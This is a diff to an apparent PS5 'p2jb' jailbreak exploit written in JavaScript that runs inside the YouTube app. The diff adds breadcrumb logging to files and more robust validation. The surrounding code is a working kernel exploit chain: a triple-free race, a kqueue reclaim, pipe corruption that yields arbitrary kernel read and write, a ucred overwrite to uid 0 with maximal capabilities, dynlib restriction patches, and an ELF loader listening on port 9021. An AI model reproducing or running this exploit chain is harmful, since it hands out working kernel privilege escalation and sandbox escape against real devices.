@@ -60,6 +60,7 @@
         const MAIN_CORE = 4;
         const MAIN_RTPRIO = 256;
         const LEAK_KQ_REPAIR_MODE = "full";
+        const KP_BREADCRUMBS = true;
 
         const SYSCALL_EXTRA = {
             recvmsg: 0x1bn,
@@ -499,6 +500,36 @@
         }
         function fail(msg) { throw new Error("p2jb: " + msg); }
 
+        let breadcrumb_fd = -1n;
+        let breadcrumb_path = "";
+
+        function init_breadcrumbs() {
+            if (!KP_BREADCRUMBS || breadcrumb_fd !== -1n) return;
+            const paths = ["/mnt/usb0/p2jb.last", "/user/temp/common_temp/p2jb.last"];
+            try { paths.push("/" + get_nidpath() + "/common_temp/p2jb.last"); } catch (_) { }
+            for (let i = 0; i < paths.length; i++) {
+                try {
+                    const fd = syscall(SYSCALL.open, alloc_string(paths[i]),
+                        O_CREAT | O_WRONLY | O_TRUNC, 0x1ffn);
+                    if (fd !== 0xffffffffffffffffn) {
+                        breadcrumb_fd = fd;
+                        breadcrumb_path = paths[i];
+                        breadcrumb("init path=" + breadcrumb_path);
+                        return;
+                    }
+                } catch (_) { }
+            }
+        }
+
+        function breadcrumb(msg) {
+            if (!KP_BREADCRUMBS || breadcrumb_fd === -1n) return;
+            try {
+                const text = "[p2jb] " + msg + "\n";
+                syscall(SYSCALL.write, breadcrumb_fd, alloc_string(text),
+                    BigInt(text.length));
+            } catch (_) { }
+        }
+
         function nanosleep_ms(ms) {
             const ts = malloc(16);
             write64(ts, BigInt(Math.floor(ms / 1000)));
@@ -881,7 +912,12 @@
 
         function triplets_valid(S) {
             return S.triplets[0] >= 0 && S.triplets[1] >= 0 && S.triplets[2] >= 0
-                && S.triplets[1] < S.ipv6_count && S.triplets[2] < S.ipv6_count;
+                && S.triplets[0] < S.ipv6_count
+                && S.triplets[1] < S.ipv6_count
+                && S.triplets[2] < S.ipv6_count
+                && S.triplets[0] !== S.triplets[1]
+                && S.triplets[0] !== S.triplets[2]
+                && S.triplets[1] !== S.triplets[2];
         }
 
         function repair_triplets(S) {
@@ -1155,6 +1191,7 @@
         }
 
         async function stage0(S) {
+            breadcrumb("stage0:start");
             send_notification("Stage 0\nTriple-free race");
 
             if (failcheck_path) {
@@ -1162,6 +1199,8 @@
             }
             for (let attempt = 1; attempt <= TRIPLEFREE_ATTEMPTS; attempt++) {
                 if (await attempt_race(S)) {
+                    breadcrumb("stage0:done attempt=" + attempt +
+                        " triplets=" + S.triplets.join(","));
                     await ulog("stage0: triplets " + S.triplets.join(",") +
                         " (attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS +
                         ")");
@@ -1194,7 +1233,11 @@
         }
 
         function kread_slow(S, kaddr, size) {
-            if (!triplets_valid(S)) return null;
+            S.kread_last_reason = "start";
+            if (!triplets_valid(S)) {
+                S.kread_last_reason = "bad_triplets_start";
+                return null;
+            }
             for (let i = 0; i < 64; i += 8) write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
             for (let i = 0; i < UIO_THREAD_NUM; i++) {
                 for (let j = 0; j < size; j++) write8(S.kread_result_bufs[i] + BigInt(j), 0n);
@@ -1205,7 +1248,10 @@
             syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
             write64(S.uio_iov_read + 8n, BigInt(size));
 
-            if (!triplets_valid(S)) return null;
+            if (!triplets_valid(S)) {
+                S.kread_last_reason = "bad_triplets_after_setup";
+                return null;
+            }
             rthdr_free_idx(S, S.triplets[1]);
             sched_yield_n(3);
 
@@ -1226,13 +1272,22 @@
                 wait_uio(S);
                 syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
             }
-            if (!found) return null;
+            if (!found) {
+                S.kread_last_reason = "uio_iov_leak_miss";
+                return null;
+            }
             leaked_iov = read64(S.rthdr_readback);
-            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;
+            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) {
+                S.kread_last_reason = "uio_iov_bad_ptr:" + toHex(leaked_iov);
+                return null;
+            }
 
             build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));
 
-            if (!triplets_valid(S)) return null;
+            if (!triplets_valid(S)) {
+                S.kread_last_reason = "bad_triplets_before_iov";
+                return null;
+            }
             rthdr_free_idx(S, S.triplets[2]);
             sched_yield_n(3);
 
@@ -1248,7 +1303,10 @@
                 S.iov_ws.wait();
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
             }
-            if (!found) return null;
+            if (!found) {
+                S.kread_last_reason = "iov_overlay_miss";
+                return null;
+            }
 
             syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
             let result = null;
@@ -1263,6 +1321,7 @@
                         S.iov_ws.wait();
                         syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
                         S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
+                        S.kread_last_reason = "triplet1_repair_miss";
                         return null;
                     }
                     S.triplets[1] = t;
@@ -1274,6 +1333,7 @@
             if (result === null) {
                 S.iov_ws.wait();
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
+                S.kread_last_reason = "result_none";
                 return null;
             }
 
@@ -1285,10 +1345,12 @@
             if (S.triplets[2] === -1) {
                 S.iov_ws.wait();
                 syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
+                S.kread_last_reason = "triplet2_repair_miss";
                 return null;
             }
             S.iov_ws.wait();
             syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.dummy_byte, 1n);
+            S.kread_last_reason = "ok";
             return result;
         }
 
@@ -1366,16 +1428,32 @@
         }
 
         function kslow64(S, kaddr) {
+            S.kslow_last_reason = "start";
             for (let attempt = 0; attempt < 3; attempt++) {
                 if (triplets_valid(S)) {
                     const buf = kread_slow(S, kaddr, 8);
                     if (buf !== null) {
                         const val = read64(buf);
                         if (val !== 0n) {
-                            if ((val >> 48n) === 0xFFFFn) return val;
-                            if ((val >> 40n) !== 0n) return val;
+                            if ((val >> 48n) === 0xFFFFn) {
+                                S.kslow_last_reason = "ok attempt=" + (attempt + 1);
+                                return val;
+                            }
+                            if ((val >> 40n) !== 0n) {
+                                S.kslow_last_reason = "ok attempt=" + (attempt + 1);
+                                return val;
+                            }
+                            S.kslow_last_reason = "bad_value:" + toHex(val) +
+                                " attempt=" + (attempt + 1);
+                        } else {
+                            S.kslow_last_reason = "zero_value attempt=" + (attempt + 1);
                         }
+                    } else {
+                        S.kslow_last_reason = S.kread_last_reason +
+                            " attempt=" + (attempt + 1);
                     }
+                } else {
+                    S.kslow_last_reason = "bad_triplets_pre attempt=" + (attempt + 1);
                 }
                 repair_triplets(S); syscall(SYSCALL.sched_yield);
             }
@@ -1383,6 +1461,7 @@
         }
 
         async function stage1(S) {
+            breadcrumb("stage1:start triplets=" + S.triplets.join(","));
             send_notification("Stage 1\nKqueue reclaim");
             rthdr_free_idx(S, S.triplets[1]);
             sched_yield_n(2);
@@ -1416,6 +1495,8 @@
             }
             if ((proc_filedesc >> 48n) !== 0xFFFFn) fail("stage1: bad filedesc: " + toHex(proc_filedesc));
             S.proc_filedesc = proc_filedesc;
+            breadcrumb("stage1:done proc_filedesc=" + toHex(proc_filedesc) +
+                " triplets=" + S.triplets.join(","));
             await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));
 
             for (let k = 0; k < 3; k++) {
@@ -1427,68 +1508,93 @@
         }
 
         async function stage2(S) {
+            breadcrumb("stage2:start proc_filedesc=" + toHex(S.proc_filedesc) +
+                " triplets=" + S.triplets.join(","));
             send_notification("Stage 2\nLeak pipe data pointers");
             await ulog("stage2: leaking pipe pointers...");
+            const stabilize_stage2_triplets = async (label) => {
+                const before = S.triplets.join(",");
+                for (let pass = 0; pass < 2; pass++) {
+                    const t1 = find_triplet(S, S.triplets[0], S.triplets[2], 50000);
+                    if (t1 !== -1) S.triplets[1] = t1;
+                    syscall(SYSCALL.sched_yield);
+                    const t2 = find_triplet(S, S.triplets[0], S.triplets[1], 50000);
+                    if (t2 !== -1) S.triplets[2] = t2;
+                    if (t1 !== -1 && t2 !== -1 && triplets_valid(S)) {
+                        const after = S.triplets.join(",");
+                        if (after !== before) {
+                            await ulog("stage2: stabilized triplets for " +
+                                label + ": " + before + " -> " + after);
+                        }
+                        return true;
+                    }
+                    nanosleep_ms(10);
+                }
+                await ulog("stage2: triplet stabilize failed for " + label +
+                    ": " + before + " -> " + S.triplets.join(","));
+                return false;
+            };
+            const read_stage2_ptr = async (name, kaddr) => {
+                if (!(await stabilize_stage2_triplets(name))) return null;
+                const t0 = Date.now();
+                await ulog("stage2: reading " + name + " @ " + toHex(kaddr) +
+                    " triplets=" + S.triplets.join(","));
+                const val = kslow64(S, kaddr);
+                const elapsed = Date.now() - t0;
+                if (val) {
+                    await ulog("stage2: " + name + "=" + toHex(val) +
+                        " (" + elapsed + "ms, " + S.kslow_last_reason + ")");
+                } else {
+                    await ulog("stage2: " + name + " read failed (" +
+                        elapsed + "ms, " + S.kslow_last_reason + ")");
+                }
+                return val;
+            };
             for (let attempt = 0; attempt < 5; attempt++) {
                 await ulog("stage2: attempt " + (attempt + 1) + "/5");
-                repair_triplets(S); nanosleep_ms(100);
-                await ulog("stage2: reading fd table");
-                const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
-                if (!fdescenttbl) {
-                    await ulog("stage2: fd table read failed");
-                    continue;
-                }
+                nanosleep_ms(100);
+                const fdescenttbl = await read_stage2_ptr("fd table",
+                    S.proc_filedesc + S.OFF.FILEDESC_OFILES);
+                if (!fdescenttbl) continue;
                 S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
-                await ulog("stage2: fd table=" + toHex(fdescenttbl));
-                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
+                nanosleep_ms(250);
 
-                await ulog("stage2: reading master file pointer");
-                const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
-                if (!master_fp) {
-                    await ulog("stage2: master file pointer read failed");
-                    continue;
-                }
-                await ulog("stage2: master_fp=" + toHex(master_fp));
-                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
+                const master_fp = await read_stage2_ptr("master file pointer",
+                    S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
+                if (!master_fp) continue;
+                nanosleep_ms(250);
 
-                await ulog("stage2: reading victim file pointer");
-                const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
-                if (!victim_fp) {
-                    await ulog("stage2: victim file pointer read failed");
-                    continue;
-                }
-                await ulog("stage2: victim_fp=" + toHex(victim_fp));
-                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
+                const victim_fp = await read_stage2_ptr("victim file pointer",
+                    S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
+                if (!victim_fp) continue;
+                nanosleep_ms(250);
 
-                await ulog("stage2: reading master pipe data");
-                S.master_pipe_data = kslow64(S, master_fp);
-                if (!S.master_pipe_data) {
-                    await ulog("stage2: master pipe data read failed");
-                    continue;
-                }
-                await ulog("stage2: master_pipe_data=" + toHex(S.master_pipe_data));
-                repair_triplets(S); nanosleep_ms(500); repair_triplets(S);
+                S.master_pipe_data = await read_stage2_ptr("master pipe data",
+                    master_fp);
+                if (!S.master_pipe_data) continue;
+                nanosleep_ms(250);
 
-                await ulog("stage2: reading victim pipe data");
-                S.victim_pipe_data = kslow64(S, victim_fp);
-                if (!S.victim_pipe_data) {
-                    await ulog("stage2: victim pipe data read failed");
-                    continue;
-                }
-                await ulog("stage2: victim_pipe_data=" + toHex(S.victim_pipe_data));
+                S.victim_pipe_data = await read_stage2_ptr("victim pipe data",
+                    victim_fp);
+                if (!S.victim_pipe_data) continue;
 
                 if (S.master_pipe_data !== S.victim_pipe_data) {
+                    breadcrumb("stage2:done master_pipe=" +
+                        toHex(S.master_pipe_data) + " victim_pipe=" +
+                        toHex(S.victim_pipe_data));
                     await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                         " victim_pipe=" + toHex(S.victim_pipe_data));
                     return;
                 }
                 await ulog("stage2: pipe data pointers matched; retrying");
-                nanosleep_ms(500); repair_triplets(S);
+                nanosleep_ms(500);
             }
             fail("stage2: failed to leak pipe pointers");
         }
 
         async function stage3(S) {
+            breadcrumb("stage3:start master_pipe=" + toHex(S.master_pipe_data) +
+                " victim_pipe=" + toHex(S.victim_pipe_data));
             send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
             await ulog("stage3: corrupting pipe buffer...");
 
@@ -1503,11 +1609,14 @@
 
             let ok = false;
             for (let attempt = 0; attempt < 40; attempt++) {
+                if (attempt === 0 || attempt === 10 || attempt === 20 || attempt === 30)
+                    breadcrumb("stage3:kwrite_slow attempt=" + (attempt + 1));
                 repair_triplets(S);
                 if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                 nanosleep_ms(100); syscall(SYSCALL.sched_yield);
             }
             if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
+            breadcrumb("stage3:pipe_corrupted");
             syscall(SYSCALL.sched_yield);
 
             const pipe_cmd = malloc(24);
@@ -1543,6 +1652,7 @@
                 kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
             }
             if (!verified) fail("stage3: verify failed");
+            breadcrumb("stage3:kernel_rw_verified");
             await ulog("stage3: kernel r/w achieved");
             S.kernel_rw_ready = true;
 
@@ -1550,6 +1660,7 @@
         }
 
         async function stage3_cleanup(S) {
+            breadcrumb("stage3_cleanup:start");
             const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
             const bump = (fp, delta) => {
                 const rc = S.kread32(fp + 0x28n);
@@ -1569,21 +1680,32 @@
             };
 
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
+                breadcrumb("stage3_cleanup:bump fd=" + fd);
                 const fp = get_fp(fd);
                 if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                 bump(fp, 0x100);
             }
-            for (const fd of S.ipv6_sockets) null_inpcb_pktopts(fd);
+            breadcrumb("stage3_cleanup:null_pktopts:start");
+            for (let i = 0; i < S.ipv6_sockets.length; i++) {
+                if ((i % 16) === 0)
+                    breadcrumb("stage3_cleanup:null_pktopts index=" + i);
+                null_inpcb_pktopts(S.ipv6_sockets[i]);
+            }
+            breadcrumb("stage3_cleanup:null_pktopts:done");
 
+            breadcrumb("stage3_cleanup:close_free_fds");
             for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                 syscall(SYSCALL.close, BigInt(S.free_fds[i]));
             }
+            breadcrumb("stage3_cleanup:close_ipv6");
             for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));
+            breadcrumb("stage3_cleanup:close_worker_sockets");
             syscall(SYSCALL.close, BigInt(S.iov_sock_a));
             syscall(SYSCALL.close, BigInt(S.iov_sock_b));
             syscall(SYSCALL.close, BigInt(S.uio_sock_a));
             syscall(SYSCALL.close, BigInt(S.uio_sock_b));
 
+            breadcrumb("stage3_cleanup:exit_workers");
             for (const w of S.iov_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
             for (const w of S.uio_read_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
             for (const w of S.uio_write_workers) S.kwrite64(w.pivotAddr, w.exitAddr);
@@ -1600,6 +1722,7 @@
             write16(S.rt_params + 2n, 0n);
             syscall(SYSCALL.rtprio_thread, RTP_SET, 0n, S.rt_params);
 
+            breadcrumb("stage3_cleanup:done");
             await ulog("stage3b: race cleanup done");
 
             await js_sleep(3000);
@@ -1691,6 +1814,7 @@
         }
 
         async function stage4(S) {
+            breadcrumb("stage4:start");
             send_notification("Stage 4\nFind curproc + rootvnode");
 
             const [sr, sw] = create_pipe();
@@ -1716,6 +1840,8 @@
             S.curproc = curproc;
             S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
             S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
+            breadcrumb("stage4:curproc=" + toHex(curproc) +
+                " ucred=" + toHex(S.proc_ucred));
             await ulog("stage4: curproc=" + toHex(curproc) + " fd=" + toHex(S.proc_fd));
 
             // Save original ucred and fd values for cleanup on exit (prevents panic on close)
@@ -1757,10 +1883,12 @@
                 fail("stage4: rootvnode not found");
             }
             S.rootvnode = rootvnode;
+            breadcrumb("stage4:done rootvnode=" + toHex(rootvnode));
             await ulog("stage4: rootvnode=" + toHex(rootvnode));
         }
 
         async function stage5(S) {
+            breadcrumb("stage5:start");
             send_notification("Stage 5\nJailbreak");
 
             S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
@@ -1779,10 +1907,12 @@
             if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                 fail("stage5: jailbreak verify failed");
             }
+            breadcrumb("stage5:done");
             await ulog("stage5: jailbreak ok");
         }
 
         async function stage6(S) {
+            breadcrumb("stage6:start");
             send_notification("Stage 6\nData_base + Debug menu");
 
             const KDATA_MASK = 0xffff804000000000n;
@@ -1802,6 +1932,7 @@
             }
             const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
             S.data_base = data_base;
+            breadcrumb("stage6:data_base=" + toHex(data_base));
             await ulog("stage6: allproc=" + toHex(allproc) +
                 " data_base=" + toHex(data_base));
 
@@ -1831,7 +1962,9 @@
             }
 
             if (ENABLE_DEBUG_MENU) {
+                breadcrumb("stage6:debug_menu:start");
                 await stage_debug_menu(S);
+                breadcrumb("stage6:debug_menu:done");
             } else {
                 await ulog("stage6: debug menu DISABLED (ENABLE_DEBUG_MENU=false)");
             }
@@ -1922,12 +2055,14 @@
         }
 
         async function stage7(S) {
+            breadcrumb("stage7:start");
             send_notification("Stage 7\nFinalize: authid + caps");
 
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
             S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);
 
+            breadcrumb("stage7:done");
             await ulog("stage7: jailbreak complete; authid+caps maximized");
             send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");
 
@@ -1988,6 +2123,7 @@
 
         async function stage_load_elf(S) {
 
+            breadcrumb("stage_elfldr:start");
             await ulog("stage_elfldr: entered");
             if (!LAUNCH_ELF_LOADER) {
                 await ulog("stage_elfldr: LAUNCH_ELF_LOADER=false - skipped");
@@ -1999,6 +2135,7 @@
                 send_notification("Stage 7\nelf loader skipped (no data_base)");
                 return;
             }
+            let chainload_started = false;
             try {
                 // ----- Primary: USB ELF loader (preferred if present) -----
                 let elf_path = null;
@@ -2017,6 +2154,7 @@
                     typeof ipv6_kernel_rw !== "undefined") {
                     await ulog("stage_elfldr: USB elfldr found at " + elf_path +
                         " - using USB path (priority over kexp)");
+                    breadcrumb("stage_elfldr:usb_path " + elf_path);
 
                     ipv6_kernel_rw.init(S.fd_ofiles, S.kread64, S.kwrite64);
                     kernel.addr.data_base = S.data_base;
@@ -2031,7 +2169,9 @@
                     await ulog("stage_elfldr: elf entry=" + toHex(entry) +
                         "; spawning elfldr...");
                     const { thr_handle, payloadout } = await elf_run(entry, elf_path);
+                    chainload_started = true;
 
+                    breadcrumb("stage_elfldr:usb_spawned");
                     await ulog("stage_elfldr: elfldr spawned - joining...");
                     const is_daemon = elf_path.endsWith("elfldr_1320.elf") || elf_path.endsWith("elfldr.elf");
                     await elf_wait_for_exit(thr_handle, payloadout, is_daemon);
@@ -2040,6 +2180,7 @@
                         await ulog("stage_elfldr: Thrd join done, payloadout = " + toHex(out));
                     }
                     await ulog("stage_elfldr: daemon should be listening on :9021");
+                    breadcrumb("stage_elfldr:usb_done");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
                         "<ps5-ip>:9021  (e.g. BD-UN-JB unpatcher)");
                     return;
@@ -2057,6 +2198,7 @@
                 // ----- Fallback: Y2JB 1.4+ kexp handoff -----
                 if (typeof load_aioshellcode === "function") {
                     await ulog("stage_elfldr: Y2JB >= 1.4 detected, using kexp handoff");
+                    breadcrumb("stage_elfldr:kexp_path");
 
                     const is_kptr = (v) =>
                         (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;
@@ -2078,6 +2220,7 @@
                     S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);
                     S.kwrite64(eboot_segments + 0x08n, 0n);
                     S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
+                    breadcrumb("stage_elfldr:dynlib_patched");
                     await ulog("stage_elfldr: dynlib patched " +
                         "(syscalls + dlsym unrestricted)");
 
@@ -2090,8 +2233,11 @@
                         " master=" + master_pipe[0] + "," + master_pipe[1] +
                         " victim=" + victim_pipe[0] + "," + victim_pipe[1] + ")");
 
+                    breadcrumb("stage_elfldr:load_aioshellcode");
                     await load_aioshellcode(allproc, master_pipe, victim_pipe);
+                    chainload_started = true;
 
+                    breadcrumb("stage_elfldr:aioshellcode_returned");
                     await ulog("stage_elfldr: load_aioshellcode returned - " +
                         "elfldr should now be listening on :9021");
                     send_notification("Stage 7\nelfldr running - send your ELF to\n" +
@@ -2102,18 +2248,28 @@
                 await ulog("stage_elfldr: no elfldr path available (USB not found, kexp unsupported)");
                 send_notification("Stage 7\nelfldr unavailable - skipped");
             } catch (e) {
+                breadcrumb("stage_elfldr:failed " + e.message);
                 await ulog("stage_elfldr: failed: " + e.message);
                 send_notification("Stage 7\nelfldr failed: " + e.message +
                     "\n(jailbreak still complete)");
             } finally {
-                await cleanup_kexp_pipes(S);
-                await cleanup_ipv6_kernel_rw(S);
+                breadcrumb("stage_elfldr:cleanup:start");
+                if (chainload_started) {
+                    breadcrumb("stage_elfldr:cleanup:skipped_chainload_started");
+                    await ulog("stage_elfldr: cleanup skipped; chainload owns " +
+                        "the handoff pipes");
+                } else {
+                    await cleanup_kexp_pipes(S);
+                    await cleanup_ipv6_kernel_rw(S);
+                    breadcrumb("stage_elfldr:cleanup:done");
+                }
             }
         }
 
         async function cleanup_kexp_pipes(S) {
             try {
                 if (!S.kexp_pipes || !S.kexp_pipes.master_rpipe_data) return;
+                breadcrumb("cleanup_kexp_pipes:start");
                 S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x00n, 0n);
                 S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x08n, 0n);
                 S.kwrite64(S.kexp_pipes.master_rpipe_data + 0x10n, 0n);
@@ -2122,6 +2278,7 @@
                 S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x08n, 0n);
                 S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x10n, 0n);
                 S.kwrite64(S.kexp_pipes.victim_rpipe_data + 0x18n, 0n);
+                breadcrumb("cleanup_kexp_pipes:done");
                 await ulog("cleanup: kexp pipe buffers zeroed");
             } catch (e) {
                 try { await ulog("cleanup_kexp_pipes: failed: " + e.message); } catch (_) { }
@@ -2134,6 +2291,7 @@
                     await ulog("cleanup_exploit_pipes: pipe data not available, skipping");
                     return;
                 }
+                breadcrumb("cleanup_exploit_pipes:start");
                 S.kwrite64(S.master_pipe_data + 0x00n, 0n);
                 S.kwrite64(S.master_pipe_data + 0x08n, 0n);
                 S.kwrite64(S.master_pipe_data + 0x10n, 0n);
@@ -2142,6 +2300,7 @@
                 S.kwrite64(S.victim_pipe_data + 0x08n, 0n);
                 S.kwrite64(S.victim_pipe_data + 0x10n, 0n);
                 S.kwrite64(S.victim_pipe_data + 0x18n, 0n);
+                breadcrumb("cleanup_exploit_pipes:done");
                 await ulog("cleanup: exploit pipe buffers zeroed");
             } catch (e) {
                 try { await ulog("cleanup_exploit_pipes: failed: " + e.message); } catch (_) { }
@@ -2151,6 +2310,7 @@
         async function cleanup_ipv6_kernel_rw(S) {
             try {
                 if (typeof ipv6_kernel_rw !== "undefined" && ipv6_kernel_rw.data) {
+                    breadcrumb("cleanup_ipv6_kernel_rw:start");
                     const d = ipv6_kernel_rw.data;
                     const so_pcb_off = S.OFF.SO_PCB || 0x18n;
                     const pktopts_off = S.OFF.INPCB_PKTOPTS || 0x120n;
@@ -2171,10 +2331,13 @@
                     };
 
                     zero_sock_pktinfo(d.master_sock, "master_sock");
+                    breadcrumb("cleanup_ipv6_kernel_rw:master_sock");
                     zero_sock_pktinfo(d.victim_sock, "victim_sock");
+                    breadcrumb("cleanup_ipv6_kernel_rw:victim_sock");
 
                     if (d.pipe_addr !== undefined && d.pipe_addr !== 0n && (d.pipe_addr >> 48n) === 0xFFFFn) {
                         try {
+                            breadcrumb("cleanup_ipv6_kernel_rw:pipe_addr");
                             // Zero entire pipe_buffer structure to prevent panic in pipe_free()
                             // Offsets: cnt=0x00, in=0x04, out=0x08, size=0x0C, buffer ptr=0x10-0x18
                             S.kwrite64(d.pipe_addr + 0x00n, 0n);  // cnt + in (32-bit each)
@@ -2184,6 +2347,7 @@
                         } catch (_) { }
                     }
 
+                    breadcrumb("cleanup_ipv6_kernel_rw:done");
                     await ulog("cleanup: ipv6_kernel_rw state neutralized; fds left open");
                 }
             } catch (e) {
@@ -2197,6 +2361,7 @@
                 await ulog("cleanup: no saved state, skipping");
                 return;
             }
+            breadcrumb("cleanup_kernel_state:start");
             await ulog("cleanup: restoring kernel state for safe exit");
             try {
                 // Restore fd rdir/jdir (most critical for exit path)
@@ -2216,8 +2381,10 @@
                 S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, S.orig_ucred.authid);
                 S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, S.orig_ucred.caps0);
                 S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, S.orig_ucred.caps1);
+                breadcrumb("cleanup_kernel_state:done");
                 await ulog("cleanup: kernel state restored");
             } catch (e) {
+                breadcrumb("cleanup_kernel_state:failed " + e.message);
                 await ulog("cleanup: failed: " + e.message);
             }
         }
@@ -2249,6 +2416,8 @@
         setup_iov_buffers(S);
         setup_uio_buffers(S);
         setup_pipes_kernrw(S);
+        breadcrumb("setup: pipes master=" + S.master_rfd + "," +
+            S.master_wfd + " victim=" + S.victim_rfd + "," + S.victim_wfd);
         await ulog("pipes master=" + S.master_rfd + "," + S.master_wfd +
             " victim=" + S.victim_rfd + "," + S.victim_wfd);
 
@@ -2259,6 +2428,8 @@
                 ", need master_rfd <= " + MAX_MASTER_RFD + ") - host noisy, " +
                 "restart YouTube, wait longer, retry. Kernel UNTOUCHED.");
         }
+        init_breadcrumbs();
+        breadcrumb("start");
         await ulog("host OK - starting 4-worker leak burn; no further log output " +
             "until stage 0 (do not interrupt)");
 
@@ -2268,17 +2439,22 @@
             setup_ipv6_spray(S);
 
             apply_main_thread_pinning(S);
+            breadcrumb("prepare_fds:start");
             await prepare_fds(S);
+            breadcrumb("prepare_fds:done");
             await stage0(S);
 
             let s123_ok = false;
             for (let r = 1; r <= 8 && !s123_ok; r++) {
                 try {
+                    breadcrumb("stages1_3:attempt=" + r);
                     await stage1(S);
                     await stage2(S);
                     await stage3(S);
                     s123_ok = true;
+                    breadcrumb("stages1_3:done attempt=" + r);
                 } catch (e) {
+                    breadcrumb("stages1_3:failed attempt=" + r + " " + e.message);
                     if (r < 8) {
                         await ulog("stages 1-3 attempt " + r + "/8 failed: " +
                             e.message);
@@ -2297,8 +2473,10 @@
             await stage_load_elf(S);
 
             cleanup_done = true;
+            breadcrumb("main:post_stage_load_elf");
 
         } catch (e) {
+            breadcrumb("main:catch " + e.message);
             if (S.kernel_rw_ready && !cleanup_done) {
                 try {
                     await cleanup_exploit_pipes(S);
@@ -2311,15 +2489,19 @@
 
         // Success path: neutralize corrupted pipe buffers so YouTube can close safely
         try {
+            breadcrumb("success_cleanup:start");
             await cleanup_exploit_pipes(S);
             for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                 try { syscall(SYSCALL.close, BigInt(fd)); } catch (_) { }
             }
+            breadcrumb("success_cleanup:done");
         } catch (_) { }
 
+        breadcrumb("complete");
         await ulog("=== p2jb complete ===");
 
     } catch (e) {
+        try { breadcrumb("fatal " + e.message); } catch (_) { }
         try { await log("p2jb FATAL: " + e.message); } catch (_) { }
         try { send_notification("p2jb FAILED: " + e.message); } catch (_) { }
     }
